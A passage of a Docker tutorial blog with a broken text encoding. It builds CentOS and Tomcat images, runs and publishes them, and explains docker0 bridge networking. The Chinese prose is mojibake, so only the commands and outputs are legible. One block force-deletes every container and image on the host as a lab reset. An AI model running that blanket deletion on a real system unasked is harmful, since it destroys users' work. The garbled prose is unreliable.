0.0s</span><br><span class="line"> =&gt; CACHED [2/7] WORKDIR /usr/local                                                                           0.0s</span><br><span class="line"> =&gt; CACHED [3/7] RUN <span class="built_in">cd</span> /etc/yum.repos.d/                                                                     0.0s</span><br><span class="line"> =&gt; CACHED [4/7] RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*                            0.0s</span><br><span class="line"> =&gt; CACHED [5/7] RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum  0.0s</span><br><span class="line"> =&gt; CACHED [6/7] RUN yum -y install vim                                                                       0.0s</span><br><span class="line"> =&gt; [7/7] RUN yum -y install net-tools                                                                        3.4s</span><br><span class="line"> =&gt; exporting to image                                                                                        0.8s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                       0.8s</span><br><span class="line"> =&gt; =&gt; writing image sha256:c3dec9b6a3f811c4d5e5038392822da54ab5e069560708059a1f8bc636eca32d                  0.0s </span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/mycentos:1.0</span><br><span class="line"> root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE                                                        </span><br><span class="line">mycentos     1.0       c3dec9b6a3f8   30 seconds ago   312MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago      231MB</span><br></pre></td></tr></table></figure>

<p>å‘½ä»¤ï¼š<code>docker build -f mydockerfile-centos -t mycentos:1.0 .</code>è§£é‡Šï¼š</p>
<p>è¿™æ˜¯ä¸€ä¸ªDockerå‘½ä»¤ï¼Œå°†ä½¿ç”¨æŒ‡å®šçš„Dockerfileæ„å»ºä¸€ä¸ªæ–°çš„Dockeré•œåƒã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œè¯¥å‘½ä»¤çš„å„ä¸ªéƒ¨åˆ†çš„å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>docker build</code>ï¼šä½¿ç”¨Dockerå‘½ä»¤æ„å»ºæ–°çš„é•œåƒ</li>
<li><code>-f mydockerfile-centos</code>ï¼šæŒ‡å®šDockerfileçš„åç§°ä¸º<code>mydockerfile-centos</code>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒDockerä½¿ç”¨å½“å‰ç›®å½•ä¸‹çš„åä¸º<code>Dockerfile</code>çš„æ–‡ä»¶ä½œä¸ºDockerfileï¼Œä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬æŒ‡å®šäº†ä¸€ä¸ªä¸åŒçš„åç§°ã€‚</li>
<li><code>-t mycentos:1.0</code>ï¼šæŒ‡å®šæ„å»ºçš„é•œåƒåç§°ä¸º<code>mycentos</code>ï¼Œæ ‡ç­¾ä¸º<code>1.0</code>ã€‚æ ‡ç­¾å¯ç”¨äºæ ‡è¯†åŒä¸€é•œåƒçš„ä¸åŒç‰ˆæœ¬æˆ–å˜ä½“ã€‚</li>
<li><code>.</code>ï¼šæŒ‡å®šä¸Šä¸‹æ–‡è·¯å¾„ï¼Œå³æ„å»ºè¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„æ–‡ä»¶è·¯å¾„ã€‚è¿™é‡Œçš„<code>.</code>è¡¨ç¤ºä½¿ç”¨å½“å‰ç›®å½•ä½œä¸ºä¸Šä¸‹æ–‡è·¯å¾„ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œè¯¥å‘½ä»¤çš„å«ä¹‰æ˜¯ä½¿ç”¨<code>mydockerfile-centos</code>æ–‡ä»¶ä½œä¸ºDockerfileï¼Œå°†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä½œä¸ºä¸Šä¸‹æ–‡æ„å»ºä¸€ä¸ªåä¸º<code>mycentos</code>ã€æ ‡ç­¾ä¸º<code>1.0</code>çš„æ–°Dockeré•œåƒã€‚</p>
</li>
<li><p>è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker run -it mycentos:1.0</span></span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># pwd</span></span><br><span class="line">/usr/local</span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 9  bytes 806 (806.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># vim a</span></span><br><span class="line">[root@391dcbf08c75 <span class="built_in">local</span>]<span class="comment"># ls</span></span><br><span class="line">a  bin	etc  games  include  lib  lib64  libexec  sbin	share  src</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ—å‡ºé•œåƒçš„å†å²</p>
<p><strong>docker history é•œåƒid</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker history c3dec9b6a3f8</span></span><br><span class="line">IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT</span><br><span class="line">c3dec9b6a3f8   5 minutes ago   CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;/bin/bash&quot;</span>]                0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;echo \&quot;----end------\&quot;&quot;</span>]   0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   CMD [<span class="string">&quot;/bin/sh&quot;</span> <span class="string">&quot;-c&quot;</span> <span class="string">&quot;echo <span class="variable">$MYPATH</span>&quot;</span>]             0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   EXPOSE map[80/tcp:&#123;&#125;]                           0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      5 minutes ago   RUN /bin/sh -c yum -y install net-tools <span class="comment"># buâ€¦   14.7MB    buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c yum -y install vim <span class="comment"># buildkit    66.3MB    buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c sed -i <span class="string">&#x27;s|#baseurl=http://mirâ€¦   8.8kB     buildkit.dockerfile.v0</span></span><br><span class="line"><span class="string">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c sed -i &#x27;</span>s/mirrorlist/<span class="comment">#mirrorlâ€¦   8.82kB    buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   RUN /bin/sh -c <span class="built_in">cd</span> /etc/yum.repos.d/ <span class="comment"># buildkâ€¦   0B        buildkit.dockerfile.v0</span></span><br><span class="line">&lt;missing&gt;      6 minutes ago   WORKDIR /usr/local                              0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      6 minutes ago   ENV MYPATH=/usr/local                           0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      6 minutes ago   MAINTAINER 6pc1&lt;pc6pc1@qq.com&gt;                  0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;      3 years ago     /bin/sh -c <span class="comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span></span><br><span class="line">&lt;missing&gt;      3 years ago     /bin/sh -c <span class="comment">#(nop)  LABEL org.label-schema.scâ€¦   0B        </span></span><br><span class="line">&lt;missing&gt;      3 years ago     /bin/sh -c <span class="comment">#(nop) ADD file:805cb5e15fb6e0bb0â€¦   231MB     </span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>CMDå’ŒENTRYPOINTçš„å»å‘—</p>
</blockquote>
<p>æˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œä¸¤ä¸ªå‘½ä»¤éƒ½æ˜¯æŒ‡å®šä¸€ä¸ªå®¹å™¨å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤</p>
<p><strong>CMD</strong>ï¼šDockerfifile ä¸­å¯ä»¥æœ‰å¤šä¸ªCMD æŒ‡ä»¤ï¼Œä½†åªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆï¼ŒCMD ä¼šè¢« docker run ä¹‹åçš„å‚æ•°</p>
<p>æ›¿æ¢ï¼</p>
<p><strong>ENTRYPOINT</strong>ï¼šdocker run ä¹‹åçš„å‚æ•°ä¼šè¢«å½“åšå‚æ•°ä¼ é€’ç»™ ENTRYPOINTï¼Œä¹‹åå½¢æˆæ–°çš„å‘½ä»¤ç»„åˆï¼</p>
<blockquote>
<p>è‡ªå®šä¹‰é•œåƒtomcat</p>
</blockquote>
<ol>
<li><p>æ–°å»ºä¸€ä¸ªè·¯å¾„ï¼Œå¹¶å‡†å¤‡å¥½tomcatå’Œjdkçš„å‹ç¼©åŒ…ï¼ˆå®˜ç½‘ä¸‹è½½åæœ¬åœ°ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼‰ï¼Œå¹¶æ–°å»ºä¸€ä¸ªread.txtã€æ–°å»ºä¸€ä¸ªDockfileæ–‡ä»¶ï¼Œå¹¶ç¼–è¾‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># cat Dockerfile </span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">MAINTAINER 6pc1&lt;pc6pc1@qq.com&gt;</span><br><span class="line"></span><br><span class="line">COPY 1.txt /usr/local/read.txt</span><br><span class="line"></span><br><span class="line">ADD apache-tomcat-9.0.95.tar /usr/local/</span><br><span class="line">ADD jdk-8u202-linux-x64.tar /usr/local/</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum -y install vim</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line"></span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk_1.8.0_202</span><br><span class="line">ENV CLASSPATH <span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.95</span><br><span class="line">ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.95</span><br><span class="line">ENV PATH <span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$CATALINA_HOME</span>/lib:<span class="variable">$CATALINA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.95/bin/startup.sh &amp;&amp; <span class="built_in">tail</span> -F /usr/local/apache-tomcat-9.0.95/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ„å»ºé•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker build -t diytomcat .</span></span><br><span class="line">[+] Building 146.5s (14/14) FINISHED                                                                docker:default</span><br><span class="line"> =&gt; [internal] load build definition from Dockerfile                                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 866B                                                                          0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:latest                                              0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                             0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                               0.0s</span><br><span class="line"> =&gt; CACHED [1/9] FROM docker.io/library/centos:latest                                                         0.0s</span><br><span class="line"> =&gt; [internal] load build context                                                                             2.5s</span><br><span class="line"> =&gt; =&gt; transferring context: 206.81MB                                                                         2.5s</span><br><span class="line"> =&gt; [2/9] COPY 1.txt /usr/local/read.txt                                                                      0.3s</span><br><span class="line"> =&gt; [3/9] ADD apache-tomcat-9.0.95.tar.gz /usr/local/                                                         0.4s</span><br><span class="line"> =&gt; [4/9] ADD jdk-8u202-linux-x64.tar.gz /usr/local/                                                          4.1s</span><br><span class="line"> =&gt; [5/9] RUN <span class="built_in">cd</span> /etc/yum.repos.d/                                                                            0.7s</span><br><span class="line"> =&gt; [6/9] RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*                                   0.3s</span><br><span class="line"> =&gt; [7/9] RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.  0.4s</span><br><span class="line"> =&gt; [8/9] RUN yum -y install vim                                                                            134.1s</span><br><span class="line"> =&gt; [9/9] WORKDIR /usr/local                                                                                  0.1s </span><br><span class="line"> =&gt; exporting to image                                                                                        3.3s </span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                       3.2s </span><br><span class="line"> =&gt; =&gt; writing image sha256:88021913b4f29d54ed2453c16e79d7259ab5414f3dc616c6d4e98ca6dad90743                  0.0s </span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/diytomcat  </span><br><span class="line"> root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker images                                    </span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">diytomcat    latest    88021913b4f2   34 seconds ago   718MB</span><br><span class="line">mycentos     1.0       c3dec9b6a3f8   59 minutes ago   312MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago      231MB</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯åŠ¨å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker run -d -p 9090:8080 --name mydiytomcat -v /home/ubuntu/test/docker-test-volume/tomcat/test:/usr/local/apache-tomcat-9.0.95/webapps/test diytomcat</span></span><br><span class="line">99f621377dba54b318e382d8f72a16ddf321888392d27b5772e1a7eeb3b1fadf</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç»“åˆå‰é¢å­¦ä¹ çš„å®¹å™¨å·å°†æµ‹è¯•çš„webæœåŠ¡testå‘å¸ƒ</p>
<p>WEB-INFä¸‹æ–°å»ºä¸€ä¸ªweb.xml</p>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.5&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">display-name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨testä¸‹æ–°å»ºä¸€ä¸ªa.jsp</p>
<p>a.jsp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt; </span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">		&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">		&lt;title&gt;helloï¼Œkuangshen&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		-----------welcome------------</span><br><span class="line">		&lt;%=<span class="string">&quot; my docker tomcat &quot;</span>%&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;% System.out.println(<span class="string">&quot;-------my docker tomcat-------&quot;</span>);%&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="5ã€å‘å¸ƒé•œåƒ"><a href="#5ã€å‘å¸ƒé•œåƒ" class="headerlink" title="5ã€å‘å¸ƒé•œåƒ"></a>5ã€å‘å¸ƒé•œåƒ</h2><blockquote>
<p>DockerHubï¼ˆä¸å»ºè®®ï¼Œå¤§æ¦‚ç‡ç™»å½•è¶…æ—¶æ„Ÿè§‰ï¼‰</p>
</blockquote>
<ol>
<li>æ³¨å†Œdockerhub  <a href="https://hub.docker.com/%EF%BC%8C%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7">https://hub.docker.com/ï¼Œæ³¨å†Œä¸€ä¸ªè´¦å·</a></li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-23/a6ca8d34b74dcf6ad91395705579a106--078a--image-20240923204922044.png" alt="image-20240923204922044"></p>
<ol start="2">
<li>ç™»å½•</li>
<li>docker pushç›´æ¥pushåˆ°ä»“åº“ä¸­ï¼Œè®°å¾—åŠ tag</li>
</ol>
<blockquote>
<p>è…¾è®¯äº‘é•œåƒæœåŠ¡</p>
</blockquote>
<ol>
<li><p>ä½¿ç”¨ä¸ªäººå…è´¹ç‰ˆä»“åº“</p>
<p>è¿™è¦æ³¨æ„ï¼Œåªæœ‰ä¸ªåˆ«åœ°æ–¹æ‰èƒ½é€‰æ‹©ä¸ªäººå…è´¹ç‰ˆä»“åº“ï¼Œè¿™è¾¹æˆ‘é€‰æ‹©çš„æ˜¯å¹¿å·</p>
</li>
<li><p>åˆ›å»ºå‘½åç©ºé—´å’Œä»“åº“</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/09d9e244fac1fcb6e6451bd95a5dd738--c8bc--image-20240925165555292.png" alt="image-20240925165555292"></p>
</li>
<li><p>ç›´æ¥å¿«æ·æŒ‡ä»¤å°±èƒ½å°†å®¹å™¨ä¸Šä¼ è‡³ä»“åº“äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/20829e4b625bcd77961e47cf15fe20fe--9066--image-20240925165713786.png" alt="image-20240925165713786"></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker login ccr.ccs.tencentyun.com --username=100036351621</span></span><br><span class="line">Password: </span><br><span class="line">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/<span class="comment">#credentials-store</span></span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>

<h2 id="6ã€æ€»ç»“"><a href="#6ã€æ€»ç»“" class="headerlink" title="6ã€æ€»ç»“"></a>6ã€æ€»ç»“</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/f728c102a55c9969c391697ddb24b104--7952--image-20240925183039622.png" alt="image-20240925183039622"></p>
<h1 id="ä¹ã€Dockerç½‘ç»œ"><a href="#ä¹ã€Dockerç½‘ç»œ" class="headerlink" title="ä¹ã€Dockerç½‘ç»œ"></a>ä¹ã€Dockerç½‘ç»œ</h1><h2 id="1ã€ç†è§£docker0"><a href="#1ã€ç†è§£docker0" class="headerlink" title="1ã€ç†è§£docker0"></a>1ã€ç†è§£docker0</h2><p>å‡†å¤‡å·¥ä½œï¼šæ¸…ç©ºæ‰€æœ‰çš„å®¹å™¨ï¼Œæ¸…ç©ºæ‰€æœ‰çš„é•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -a -q)    <span class="comment"># åˆ é™¤æ‰€æœ‰å®¹å™¨ </span></span><br><span class="line">docker rmi -f $(docker images -qa) <span class="comment"># åˆ é™¤å…¨éƒ¨é•œåƒ</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å…ˆåšä¸ªæµ‹è¯•â€“ç°è±¡</p>
</blockquote>
<ol>
<li><p>åˆ¶ä½œä¸€ä¸ªå¯ä»¥ä½¿ç”¨<code>ip addr</code>å’Œ<code>ping</code>å‘½ä»¤çš„é•œåƒï¼ˆå·²ç»æ”¯æŒçš„ï¼Œå¯ä»¥å¿½ç•¥è¿™ä¸ªæ­¥éª¤ï¼‰</p>
<p>ä¸‹è½½tomcatåŸç”Ÿé•œåƒå¹¶å¯åŠ¨tomcatå®¹å™¨<code>tomcat01</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker run -d -P --name tomcat01 tomcat</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å®¹å™¨<code>tomcat01</code>å†…éƒ¨çš„ipåœ°å€ï¼Œå‘ç°æŠ¥é”™å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker exec -it tomcat01 ip addr</span></span><br><span class="line">OCI runtime <span class="built_in">exec</span> failed: <span class="built_in">exec</span> failed: unable to start container process: <span class="built_in">exec</span>: <span class="string">&quot;ip&quot;</span>: executable file not found <span class="keyword">in</span> <span class="variable">$PATH</span>: unknown</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker exec -it tomcat01 /bin/bash</span></span><br><span class="line">\\root@fb4000629c55:/usr/local/tomcat<span class="comment"># ip addr</span></span><br><span class="line">bash: ip: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤ï¼Œå³å¯è§£å†³</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y iproute2</span><br></pre></td></tr></table></figure>

<p>åœ¨å®¹å™¨<code>tomcat01</code>pingä¸€ä¸‹ï¼Œå‘ç°æŠ¥é”™å¦‚ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@fb4000629c55:/usr/local/tomcat<span class="comment"># ping 172.17.0.2</span></span><br><span class="line">bash: ping: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤ï¼Œå³å¯è§£å†³</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y iputils-ping</span><br></pre></td></tr></table></figure>

<p>å®¹å™¨æ‰§è¡Œäº†ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤åï¼Œå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨<code>ip addr</code>å’Œ<code>ping</code>è¿™ä¸¤ä¸ªå‘½ä»¤äº†ï¼Œç„¶åæˆ‘ä»¬æŠŠå®¹å™¨commitä¸€ä¸‹ï¼Œå°±æœ‰ä¸ªä¸€ä¸ªæ–°çš„é•œåƒäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker commit fb4000629c55 my-tomcat01:1.0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æŸ¥çœ‹ä¸€ä¸‹ä¸»æœºæœ¬åœ°çš„ip åœ°å€<code>ip addr</code></p>
<ul>
<li><p>lo æœ¬æœºå›ç¯åœ°å€</p>
</li>
<li><p>eth0 é˜¿é‡Œäº‘çš„ç§æœ‰ip</p>
</li>
<li><p>docker0  dockerç½‘æ¡¥</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/846f432f3bb1ac63bb7d25b7de5f8c2f--fb7d--image-20240925185532091.png" alt="image-20240925185532091"></p>
</li>
<li><p>å¯åŠ¨å®¹å™¨<code>tomcat01</code>,æŸ¥çœ‹ä¸€ä¸‹å®¹å™¨çš„ipï¼Œç„¶åå†æŸ¥ä¸€ä¸‹ä¸»æœºæœ¬åœ°ip</p>
<p>dockerä¼šç»™æ¯ä¸ªå®¹å™¨éƒ½åˆ†é…ä¸€ä¸ªip</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/9791e62266d3c6d5a8bc17a6068664f7--1062--image-20240925185336056.png" alt="image-20240925185336056"></p>
</li>
<li><p>æˆ‘ä»¬å†èµ·ä¸€ä¸ªå®¹å™¨ï¼Œç»“æœèƒ½å¤Ÿå‘ç°ä¸¤ä¸ªå®¹å™¨ä¹‹é—´æ˜¯èƒ½å¤Ÿpingé€šçš„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@fb4000629c55:/usr/local/tomcat<span class="comment"># ping 172.17.0.3</span></span><br><span class="line">PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.099 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.067 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=3 ttl=64 time=0.064 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=4 ttl=64 time=0.060 ms</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>åŸç†</p>
</blockquote>
<ol>
<li><p>æ¯ä¸€ä¸ªå®‰è£…äº†Dockerçš„linuxä¸»æœºéƒ½æœ‰ä¸€ä¸ªdocker0çš„è™šæ‹Ÿç½‘å¡ã€‚è¿™æ˜¯ä¸ªæ¡¥æ¥ç½‘å¡ï¼Œä½¿ç”¨äº†veth-pair</p>
<p>æŠ€æœ¯ï¼</p>
</li>
<li><p>æ¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œlinuxä¸»æœºå°±ä¼šå¤šäº†ä¸€ä¸ªè™šæ‹Ÿç½‘å¡ã€‚</p>
<p>veth-pair å°±æ˜¯ä¸€å¯¹çš„è™šæ‹Ÿè®¾å¤‡æ¥å£ï¼Œå®ƒéƒ½æ˜¯æˆå¯¹å‡ºç°çš„ã€‚ä¸€ç«¯è¿ç€åè®®æ ˆï¼Œä¸€ç«¯å½¼æ­¤ç›¸è¿ç€ã€‚</p>
<p>æ­£å› ä¸ºæœ‰è¿™ä¸ªç‰¹æ€§ï¼Œå®ƒå¸¸å¸¸å……å½“ç€ä¸€ä¸ªæ¡¥æ¢ï¼Œè¿æ¥ç€å„ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡!</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/e4b78b4838e2a9c46e21b74356f18387--5b2e--image-20240925185927195.png" alt="image-20240925185927195"></p>
